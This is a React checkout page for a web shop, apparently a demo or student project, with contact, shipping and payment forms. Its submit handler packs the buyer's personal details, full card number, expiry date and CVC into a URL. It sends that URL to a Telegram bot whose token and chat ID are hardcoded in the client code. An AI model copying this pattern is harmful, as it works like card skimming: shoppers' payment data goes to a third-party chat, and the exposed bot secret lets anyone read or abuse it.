import React, { memo, useEffect, useState } from "react";
import { FaCheck } from "react-icons/fa";
import { CiCreditCard1 } from "react-icons/ci";
import { useSelector, useDispatch } from "react-redux";
import { useNavigate } from "react-router-dom";
import {
  increaseAmount,
  decreaseAmount,
  removeAll,
} from "../../context/slices/cartSlice";
import "./checkout.scss";

const Checkout = () => {
  const dispatch = useDispatch();
  const navigate = useNavigate();
  const cartData = useSelector((state) => state.cart.value);
  const orderValue = useSelector((state) => state.order.value);

  useEffect(() => {
    if (!orderValue || !cartData.length) {
      navigate("/cart");
    }
  }, [orderValue, cartData.length]);

  if (!cartData.length) {
    navigate("/cart");
  }

  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [country, setCountry] = useState("uzb");
  const [state, setState] = useState("");
  const [city, setCity] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [address, setAddress] = useState("");
  const [zip, setZip] = useState("");
  const [date, setDate] = useState("");
  const [method, setMethod] = useState("");
  const [cvc, setCvc] = useState("");

  const BOT_TOKEN = "7313879684:AAH0lhoKddXhkYP-YO5QnYueauqqT3J9hzE";
  const CHAT_ID = "-1002180292093";

  const handleChooseMethod = (method) => {
    localStorage.setItem("method", method);
    setMethod(method);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    

    let text = `Checkout Info %0A`;
    text += `First Name: ${firstName} %0A`;
    text += `Last Name: ${lastName} %0A`;
    text += `Phone: ${phone} %0A`;
    text += `Email: ${email} %0A`;
    text += `Country: ${country} %0A`;
    text += `State: ${state} %0A`;
    text += `City: ${city} %0A`;
    text += `Address: ${address} %0A`;
    text += `ZIP Code: ${zip} %0A`;
    text += `Card Number: ${cardNumber} %0A`;
    text += `Date: ${date} %0A`;
    text += `CVC: ${cvc} %0A`;
    text += `Method: ${method} %0A`;

    cartData.forEach((item, index) => {
      text += `Product ${index + 1}: ${item.title} - $${item.price} x ${
        item.amount
      } %0A`;
    });

    const totalAmount = cartData.reduce(
      (sum, item) => sum + item.price * item.amount,
      0
    );
    text += `Total Amount: $${totalAmount} %0A`;

    let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();
    navigate("/complete");

    setFirstName("");
    setLastName("");
    setPhone("");
    setEmail("");
    setCountry("uzb");
    setState("");
    setCity("");
    setAddress("");
    setZip("");
    setCardNumber("");
    setDate("");
    setCvc("");
    setMethod("");
  };

  return (
    <div className="checkout container">
      <div className="checkout__header">
        <h1>Checkout</h1>
        <div className="checkout__steps">
          <div className="checkout__step done__step">
            <span>
              <FaCheck />
            </span>
            <p>Shopping cart</p>
          </div>
          <div className="checkout__step active__step">
            <span>2</span>
            <p>Checkout details</p>
          </div>
          <div className="checkout__step">
            <span>3</span>
            <p>Order complete</p>
          </div>
        </div>
      </div>
      <div className="checkout__body">
        <form className="checkout__body__left" onSubmit={handleSubmit}>
          <div className="checkout__section">
            <h2>Contact Information</h2>
            <div className="full__name">
              <div className="input__group">
                <label htmlFor="firstName">FIRST NAME</label>
                <input
                  placeholder="First name"
                  type="text"
                  value={firstName}
                  onChange={(e) => setFirstName(e.target.value)}
                  required
                />
              </div>
              <div className="input__group">
                <label htmlFor="lastName">LAST NAME</label>
                <input
                  placeholder="Last name"
                  type="text"
                  value={lastName}
                  onChange={(e) => setLastName(e.target.value)}
                  required
                />
              </div>
            </div>
            <div className="input__group">
              <label htmlFor="phoneNumber">PHONE NUMBER</label>
              <input
                placeholder="Phone number"
                type="text"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                required
              />
            </div>
            <div className="input__group">
              <label htmlFor="email">EMAIL ADDRESS</label>
              <input
                placeholder="Email"
                id="email"
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
            </div>
          </div>
          <div className="checkout__section">
            <h2>Shipping Address</h2>
            <div className="input__group">
              <label htmlFor="country">COUNTRY</label>
              <select
                id="country"
                value={country}
                onChange={(e) => setCountry(e.target.value)}
              >
                <option value="uzb">Uzbekistan</option>
                <option value="us">United States</option>
                <option value="uk">United Kingdom</option>
                <option value="canada">Canada</option>
                <option value="germany">Germany</option>
                <option value="france">France</option>
              </select>
            </div>

            <div className="input__group">
              <label htmlFor="city">CITY</label>
              <input
                placeholder="City"
                type="text"
                value={city}
                onChange={(e) => setCity(e.target.value)}
                required
              />
            </div>
            <div className="input__group">
              <label htmlFor="address">ADDRESS</label>
              <input
                placeholder="Address"
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                required
              />
            </div>
            <div className="full__name">
              <div className="input__group">
                <label htmlFor="state">STATE</label>
                <input
                  placeholder="State"
                  type="text"
                  value={state}
                  onChange={(e) => setState(e.target.value)}
                  required
                />
              </div>
              <div className="input__group zip__code">
                <label htmlFor="zip">ZIP/POSTAL CODE</label>
                <input
                  placeholder="ZIP/Postal code"
                  type="text"
                  value={zip}
                  onChange={(e) => setZip(e.target.value)}
                  required
                />
              </div>
            </div>
          </div>
          <div className="checkout__section">
            <h2>Payment</h2>
            <label
              onClick={() => handleChooseMethod("Via Credit card")}
              className="payment__method"
              htmlFor="credit__card"
            >
              <input
                onSelect={(e) => setMethod(e.target.value)}
                type="radio"
                id="credit__card"
                name="payment"
                value="Credit card"
              />
              <p>Pay by Card Credit</p>
              <CiCreditCard1 />
            </label>
            <label
              onClick={() => handleChooseMethod("Via Paypal")}
              className="payment__method"
              htmlFor="paypal"
            >
              <input
                onSelect={(e) => setMethod(e.target.value)}
                type="radio"
                id="paypal"
                name="payment"
                value="Paypal"
              />
              <p>Paypal</p>
            </label>
            <hr />
            <div className="input__group">
              <label htmlFor="cardNumber">CARD NUMBER</label>
              <input
                placeholder="1234 5678 9012 3456"
                type="number"
                id="cardNumber"
                maxLength={16}
                minLength={16}
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                required
              />
            </div>
            <div className="full__name">
              <div className="input__group">
                <label htmlFor="expirationDate">EXPIRATION DATE</label>
                <input
                  placeholder="MM/YY"
                  type="date"
                  id="expirationDate"
                  maxLength={4}
                  minLength={4}
                  value={date}
                  onChange={(e) => setDate(e.target.value)}
                  required
                />
              </div>
              <div className="input__group">
                <label htmlFor="cvc">CVC</label>
                <input
                  placeholder="CVC"
                  type="text"
                  id="cvc"
                  value={cvc}
                  onChange={(e) => setCvc(e.target.value)}
                  required
                />
              </div>
            </div>
          </div>
          <button className="checkout__btn" type="submit">
            Place Order
          </button>
        </form>
        <div className="checkout__body__right">
          <div className="checkout__cards">
            {cartData?.map((item, index) => (
              <div className="checkout__card" key={item.id}>
                <div className="checkout__card__left">
                  <img
                    className="checkout__card__left__img"
                    src={item.images[0]}
                    alt=""
                  />
                  <div className="checkout__card__left__info">
                    <h3 className="checkout__card__left__info__title">
                      {item.title}
                    </h3>
                    <div className="cart__counter-btns">
                      <button
                        disabled={item.amount === 1}
                        onClick={() => dispatch(decreaseAmount(item))}
                      >
                        -
                      </button>
                      <span className="text-2xl">{item.amount}</span>
                      <button
                        disabled={item.amount === item.stock}
                        onClick={() => dispatch(increaseAmount(item))}
                      >
                        +
                      </button>
                    </div>
                  </div>
                </div>
                <div className="checkout__card__right">
                  <p>${item.price * item.amount}</p>
                </div>
              </div>
            ))}
          </div>
          <div className="input__apply">
            <input placeholder="Input" type="text" />
            <button>Apply</button>
          </div>
          <div className="totals">
            <ul>
              <p>Shipping</p>
              <p>Free</p>
            </ul>
            <ul>
              <p>Subtotal</p>
              <p>
                $
                {cartData.reduce(
                  (sum, item) => sum + item.price * item.amount,
                  0
                )}
              </p>
            </ul>
            <ul>
              <h3>Total</h3>
              <h3>
                $
                {cartData.reduce(
                  (sum, item) => sum + item.price * item.amount,
                  0
                )}
              </h3>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
};

export default memo(Checkout);
